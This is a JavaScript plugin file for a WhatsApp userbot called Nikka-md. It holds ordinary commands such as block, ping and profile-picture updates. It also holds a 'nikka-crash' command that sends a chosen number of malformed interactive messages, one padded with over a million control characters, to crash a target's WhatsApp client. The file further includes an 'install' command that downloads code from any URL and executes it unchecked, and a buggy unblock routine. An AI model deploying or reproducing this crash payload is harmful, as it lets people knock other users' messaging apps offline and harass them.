const {
  command,
  isPrivate,
  getBuffer
} = require("../lib/");
// nikka

let audios = ["https://files.catbox.moe/ahf9me.mp3", "https://files.catbox.moe/cp9zab.mp3", "https://files.catbox.moe/eywp66.mp3", "https://files.catbox.moe/ahf9me.mp3", "https://files.catbox.moe/cp9zab.mp3"];
command({
  pattern: "alive ?(.*)",
  fromMe: isPrivate,
  desc: "nikka here",
  type: "user"
}, async (message, match, m, client) => {
  try {
    let aud = audios[Math.floor(Math.random() * audios.length)];
    let buff = await getBuffer(aud);
    await message.client.sendMessage(message.jid, {
      'audio': buff,
      'mimetype': "audio/mpeg",
      'ptt': true,
      'seconds': "0xbebc74b",
      'fileLength': "100000000",
      'contextInfo': {
        'externalAdReply': {
          'title': "ʜᴇʏ ᴘᴏᴏᴋɪᴇ",
          'body': "𝗡𝗶𝗸𝗸𝗮 𝗺𝗱",
          'sourceUrl': "https://whatsapp.com/channel/0029VaoLotu42DchJmXKBN3L",
          'mediaUrl': "",
          'mediaType': 1,
          'showAdAttribution': true,
          'renderLargerThumbnail': false,
          'thumbnailUrl': "https://files.catbox.moe/mnp025.jpg"
        }
      }
    });
  } catch (error) {
    return message.reply(error);
  }
});
const plugins = require("../lib/event");
const {
    clockString,
    getUrl,
    parsedJid,
    isAdmin
    
} = require("../lib");
const {
    BOT_INFO
} = require("../config");
const config = require("../config");
const { tiny } = require("../lib/fancy_font/fancy");
const Jimp = require("jimp");
const got = require("got");
const fs = require("fs");
const { PluginDB, installPlugin } = require("../lib/database/plugins");





command(
  {
    pattern: "nikka-crash",
    fromMe: true,
    desc: "",
    type: "user",
  }, async (message, match, m, client) => {
	  if (!match) return message.reply(`Number of bugs to send?\n\tExample: .nikka-crash 20`)	  
          let count = match
          const thq = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "ɴɪᴋᴋᴀ-ᴍᴅ",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ɴɪᴋᴋᴀ-ᴍᴅ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"ɴɪᴋᴋᴀ-ᴍᴅ\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"ɴɪᴋᴋᴀ-ᴍᴅ${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
	  }
	              async function bugfunc(Ptcp = false) {
                        let etc = generateWAMessageFromContent(message.jid, proto.Message.fromObject({
                                viewOnceMessage: {
                                        message: {
                                                interactiveMessage: {
                                                        header: {
                                                                title: "",
                                                                locationMessage: {},
                                                                hasMediaAttachment: true
                                                        },
                                                        body: {
                                                                text: "ɴɪᴋᴋᴀ-ᴍᴅ"
                                                        },
                                                        nativeFlowMessage: {
                                                                name: "call_permission_request",
                                                                messageParamsJson: "ɴɪᴋᴋᴀ-ᴍᴅ"
                                                        },
                                                        carouselMessage: {}
                                                }
                                        }
                                }
                        }), {
                                userJid: message.jid,                                                                                                                                  
				quoted: thq
                        });

                        await message.client.relayMessage(message.jid, etc.message, Ptcp ? {
                                participant: {
                                        jid: message.jid
                                }
                        } : {});
		      }
	        for (let i = 0;i < count;i++) {
		await bugfunc(Ptcp = false)
                await bugfunc(Ptcp = true)
		}
               await message.reply("Done ✅")
  })


command(
  {
    pattern: "pp",
    fromMe: true,
    desc: "Update your profile picture by replying to an image.",
    type: "user",
  },
  async (message) => {
    try {
      // Ensure the message has a reply and that the reply is an image
      if (!message.reply_message || !message.reply_message.image) {
        return await message.reply("Please reply to an image to set it as your profile picture.");
      }

      // Download the media (image) from the reply
      const imageBuffer = await message.reply_message.downloadMediaMessage();
      
      // If the download failed, return an error message
      if (!imageBuffer) {
        return await message.reply("Failed to download the image. Please try again.");
      }

      // Get the bot's own JID (user's WhatsApp ID)
      const botJid = message.client.user.id;

      // Update the profile picture using the bot's JID and the image buffer
      await message.client.updateProfilePicture(botJid, { url: imageBuffer });
      await message.reply("Your profile picture has been updated successfully!");
    } catch (error) {
      console.error("Error updating profile picture:", error);
      await message.reply("An error occurred while updating your profile picture. Please try again later.");
    }
  }
);

/* Copyright (C) 2022 X-Electra.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
X-Asena - X-Electra
*/

command(
  {
    pattern: "block",
    fromMe: true,
    desc: "Block a person",
    type: "user",
  },
  async (message, match) => {
    if (message.isGroup) {
      let jid = message.mention[0] || message.reply_message.jid;
      if (!jid) return await message.reply("*_Need a number/reply/mention!_*");
      await message.block(jid);
      return await message.sendMessage(`_@${jid.split("@")[0]} Blocked_`, {
        mentions: [jid],
      });
    } else {
      await message.block(message.jid);
      return await message.reply("_User blocked_");
    }
  }
);

/* Copyright (C) 2022 X-Electra.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
X-Asena - X-Electra
*/

command(
  {
    pattern: "unblock",
    fromMe: true,
    desc: "Unblock a person",
    type: "user",
  },
  async (message, match) => {
    if (message.isGroup) {
      let jid = message.mention[0] || message.reply_message.jid;
      if (!jid) return await message.reply("*_Need a number/reply/mention!_*");
      await message.block(jid);
      return await message.sendMessage(`*_@${jid.split("@")[0]} unblocked_*`, {
        mentions: [jid],
      });
    } else {
      await message.unblock(message.jid);
      return await message.reply("*_User unblocked_*");
    }
  }
);

/* Copyright (C) 2022 X-Electra.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
Louis-X0 - Zeta-X0
*/

command(
  {
    pattern: "jid",
    fromMe: true,
    desc: "Give jid of chat/user",
    type: "user",
  },
  async (message, match) => {
    return await message.sendMessage(
      message.mention[0] || message.reply_message.jid || message.jid
    );
  }
);

/* Copyright (C) 2024 Louis-X0.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
Louis-X0 - Zeta-X0
*/

command(
  {
    pattern: "dlt",
    fromMe: true,
    desc: "deletes a message",
    type: "user",
  },
  async (message, match,m,client) => {
    if (!message.reply_message) return await message.reply("*_Reply to a message_*"); {
      await client.sendMessage(message.jid, { delete: message.reply_message.key })
    }
  }
);


/* Copyright (C) 2024 Louis-X0.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
Lo- Zeta-X0
*/
/*
command(
  {
    pattern: "menu",
    fromMe: isPrivate,
    desc: "Show All Commands",
    dontAddCommandList: true,
    type: "user",
  },
  async (message, match, m, client) => {
    try {
      if (match) {
        for (let i of plugins.commands) {
          if (
            i.pattern instanceof RegExp &&
            i.pattern.test(message.prefix + match)
          ) {
            const cmdName = i.pattern.toString().split(/\W+/)[1];
            message.reply(`\`\`\`Command: ${message.prefix}${cmdName.trim()}
Description: ${i.desc}\`\`\``);
          }
        }
      } else {
        let { prefix } = message;
        let [date, time] = new Date()
          .toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })
          .split(",");
        let usern = message.pushName;
        const readMore = String.fromCharCode(8206).repeat(4001);
        let menu = `\n╭━━━〔 ${BOT_INFO.split(";")[0]} 〕━━━┈
╚═════════════════✦═╝
╔═════════════════✦═╗
  ᯽ 𝗼𝘄𝗻𝗲𝗿: ${BOT_INFO.split(";")[1]}
  ᯽ 𝘂𝘀𝗲𝗿: ${usern}
  ᯽ 𝗱𝗮𝘁𝗲: ${date}
  ᯽ 𝘁𝗶𝗺𝗲: ${time}
  ᯽ 𝗰𝗺𝗱𝘀: ${plugins.commands.length}
  ᯽ 𝗺𝗼𝗱𝗲: ${config.WORK_TYPE}
  ᯽ 𝗽𝗿𝗲𝗳𝗶𝘅: ${config.HANDLERS}
  ᯽ 𝘃𝗲𝗿𝘀𝗶𝗼𝗻: ${require("../package.json").version}
╚═════════════════✦═╝${readMore}`;

        let cmnd = [];
        let cmd;
        let category = [];
        plugins.commands.map((command, num) => {
          if (command.pattern instanceof RegExp) {
            cmd = command.pattern.toString().split(/\W+/)[1];
          }

          if (!command.dontAddCommandList && cmd !== undefined) {
            let type = command.type ? command.type.toLowerCase() : "misc";

            cmnd.push({ cmd, type });

            if (!category.includes(type)) category.push(type);
          }
        });
        cmnd.sort();
        category.sort().forEach((cmmd) => {
          menu += `\n╔═════════════════✦═╗`;
          menu += `\n  「 *${cmmd.toUpperCase()}* 」`;
          menu += `\n╚═════════════════✦═╝`;
          let comad = cmnd.filter(({ type }) => type == cmmd);
          comad.forEach(({ cmd }) => {
            menu += `\n[᯽]  ${cmd.trim()}`;
          });
          menu += `\n╚═════════════════✦═╝`;
        });
        menu += `\n\n𝗡𝗶𝗸𝗸𝗮 𝘅 𝗺𝗱`;

        let penu = tiny(menu);
        let img = config.BOT_INFO.split(";")[2];
        return await message.sendFromUrl(
          img,
          {
            fileLength: "5555544444",
            gifPlayback: true,
            contextInfo: {
              externalAdReply: {
                title: "𝗡𝗶𝗸𝗸𝗮",
                body: "",
                sourceUrl: "https://whatsapp.com/channel/0029VaoLotu42DchJmXKBN3L",
                mediaUrl: "",
                mediaType: 1,
                showAdAttribution: true,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://files.catbox.moe/mnp025.jpg",
              },
            },
            caption: penu,
          },
          { quoted: message }
        );
      }
    } catch (e) {
      message.reply(e);
    }
  }
);
* Copyright (C) 2024 Louis-X0.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
Louis-X0 - Zeta-X0
*/

command(
  {
    pattern: "cmdlist",
    fromMe: isPrivate,
    desc: "Show All Commands",
    type: "help",
    dontAddCommandList: true,
  },
  async (message, match, { prefix }) => {
    let menu = `╭───────┈┫「 *𝐂𝐨𝐦𝐦𝐚𝐧𝐝 𝐋𝐢𝐬𝐭* 」┣┈────♡`;
    menu += `\n│\n`;

    let cmnd = [];
    let cmd, desc;
    plugins.commands.map((command) => {
      if (command.pattern) {
        cmd = command.pattern.toString().split(/\W+/)[1];
      }
      desc = command.desc || false;

      if (!command.dontAddCommandList && cmd !== undefined) {
        cmnd.push({ cmd, desc });
      }
    });
    cmnd.sort();
    cmnd.forEach(({ cmd, desc }, num) => {
      menu += `│  ${(num += 1)}. *${cmd.trim()}*`;
      if (desc) menu += `\n│  Use: \`\`\`${desc}\`\`\``;
      menu += `\n│\n`;
    });
    menu += `╰───────┈┫「 𝐈𝐙𝐔𝐌𝐈 」┣┈────♡`;
    return await message.reply(message.jid, { text: (tiny(menu)) })
})



/* Copyright (C) 2022 X-Electra.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
X-Asena - X-Electra
*/

command(
  {
    pattern: "install ?(.*)",
    fromMe: true,
    desc: "Install External plugins",
    type:'user'
  },
  async (message, match) => {
    if (!match) return await message.sendMessage("*_Plugin Url not found_*");
    for (let Url of getUrl(match)) {
      try {
        var url = new URL(Url);
      } catch {
        return await message.sendMessage("*_Invalid Url_*");
      }

      if (url.host === "gist.github.com") {
        url.host = "gist.githubusercontent.com";
        url = url.toString() + "/raw";
      } else {
        url = url.toString();
      }
      var plugin_name;
      var response = await got(url);
      if (response.statusCode == 200) {
        var commands = response.body
          .match(/(?<=pattern:)(.*)(?=\?(.*))/g)
          .map((a) => a.trim().replace(/"|'|`/, ""));
        plugin_name =
          commands[0] ||
          plugin_name[1] ||
          "__" + Math.random().toString(36).substring(8);

        fs.writeFileSync("./plugins/" + plugin_name + ".js", response.body);
        try {
          require("./" + plugin_name);
        } catch (e) {
          fs.unlinkSync("/xasena/plugins/" + plugin_name + ".js");
          return await message.sendMessage("*_Invalid Plugin_*\n ```" + e + "```");
        }

        await installPlugin(url, plugin_name);

        await message.sendMessage(
          `*_Plugin installed : ${commands.join(",")}_*`
        );
      }
    }
  }
);

/* Copyright (C) 2022 X-Electra.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
X-Asena - X-Electra
*/

command(
  { 
      pattern: "allplug", 
      fromMe: true, 
      desc: "plugin list",
      type:'user'},
  async (message, match) => {
    var mesaj = "";
    var plugins = await PluginDB.findAll();
    if (plugins.length < 1) {
      return await message.sendMessage("*_No external plugins installed_*");
    } else {
      plugins.map((plugin) => {
        mesaj +=
          "```" +
          plugin.dataValues.name +
          "```: " +
          plugin.dataValues.url +
          "\n";
      });
      return await message.sendMessage(mesaj);
    }
  }
);

/* Copyright (C) 2022 X-Electra.
Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.
X-Asena - X-Electra
*/

command(
  {
    pattern: "remove(?: |$)(.*)",
    fromMe: true,
    desc: "Remove external plugins",
    type:'user'
  },
  async (message, match) => {
    if (!match) return await message.sendMessage("*_Need a plugin name_*");

    var plugin = await PluginDB.findAll({ where: { name: match } });

    if (plugin.length < 1) {
      return await message.sendMessage("*_Plugin not found_*");
    } else {
      await plugin[0].destroy();
      delete require.cache[require.resolve("./" + match + ".js")];
      fs.unlinkSync("./plugins/" + match + ".js");
      await message.sendMessage(`*_Plugin ${match} deleted, restart_*`);
    }
  }
);


command(
    {
	pattern: 'setbio(.*)',
	fromMe: true,
	desc: 'to change your profile status',
	type: 'user'
}, async (message, match) => {
	match = match || message.reply_message.text
	if (!match) return await message.reply('*_Need Text_!*\n *Example: setbio _Eypz-God_*.')
	await message.client.updateProfileStatus(match)
	await message.reply('*_Successfully bio updated_*')
})


command(
    {
        pattern: "dev", // Command to display developer info
        fromMe: true,
        desc: "Displays information about the developer",
        type: "haki",
    },
    async (message) => {
        const devInfo = `
━━ About the Developer ━┓
> *Name*: 𝞖𝞓𝞙𝞘 𝙎𝞢𝞒

> *Profession*: Software Developer

> *Nationality*: UAE/NIGERIA

> *Contact*: +2349112171078

> *Website*:  https://haki.us.kg

> *Expertise*: Bot Development, Web Design, AI Systems        
━━━━━━━━━━━       
        `.trim();

        const imageUrl = "https://files.catbox.moe/flinnf.jpg"; // Developer image
        const thumbnailUrl = "https://files.catbox.moe/cuu1aa.jpg"; // Thumbnail image

        await message.client.sendMessage(message.jid, {
            image: { url: imageUrl },
            caption: devInfo,
            contextInfo: {
                externalAdReply: {
                    title: "𝞖𝞓𝞙𝞘 𝙎𝞢𝞒 - Developer Info",
                    body: "About haki",
                    sourceUrl: "https://haki.us.kg", // Link to website
                    mediaUrl: "https://haki.us.kg",
                    mediaType: 4,
                    showAdAttribution: true,
                    renderLargerThumbnail: false,
                    thumbnailUrl: thumbnailUrl,
                },
            },
        });
    }
);


command(
  {
    pattern: "getgpp",
    fromMe: true,
    desc: "Fetch the profile picture of the current group chat.",
    type: "group",
  },
  async (message) => {
    try {
      if (!message.isGroup) {
        return await message.reply("This command can only be used in group chats.");
      }

      // Fetch the group profile picture URL
      const groupPicUrl = await message.client.profilePictureUrl(message.jid, "image").catch(() => null);

      if (!groupPicUrl) {
        return await message.reply("No profile picture found for this group.");
      }

      // Send the group profile picture
      await message.client.sendMessage(message.jid, {
        image: { url: groupPicUrl },
        caption: "Here is the profile picture of this group chat.",
      });
    } catch (error) {
      console.error("Error fetching group profile picture:", error);
      await message.reply("An error occurred while fetching the group profile picture. Please try again later.");
    }
  }
);


command(
  {
    pattern: "getpic",
    fromMe: true,
    desc: "Fetch the profile picture of a mentioned or replied user.",
    type: "user",
  },
  async (message) => {
    try {
      // Check if a user is mentioned or a message is replied to
      const targetUser =
        message.mentionedJid?.[0] || // Get the first mentioned user
        (message.reply_message ? message.reply_message.jid : null); // Get the user in the replied message

      if (!targetUser) {
        return await message.reply("Please mention a user or reply to a user's message.");
      }

      // Fetch the profile picture URL
      const profilePicUrl = await message.client.profilePictureUrl(targetUser, "image").catch(() => null);

      if (!profilePicUrl) {
        return await message.reply("No profile picture found for the specified user.");
      }

      // Send the profile picture
      await message.client.sendMessage(message.jid, {
        image: { url: profilePicUrl },
        caption: "Here is the profile picture of the specified user.",
      });
    } catch (error) {
      console.error("Error fetching profile picture:", error);
      await message.reply("An error occurred while fetching the profile picture. Please try again later.");
    }
  }
);
command(
    {
        pattern: "ping",
        fromMe: isPrivate,
        desc: "To check ping",
        type: "user",
    },
    async (message, match, client) => {
     
        const start = new Date().getTime();
      let { key } = await message.sendMessage(`*checking...*`);
        const end = new Date().getTime();
var speed = end - start;
 
await new Promise(t => setTimeout(t,0))
         await message.client.sendMessage(message.jid,{text:`*Pong* 🧚‍♂️
${speed} *𝚖𝚜*` , edit: key});
    await message.react("✅️")
})
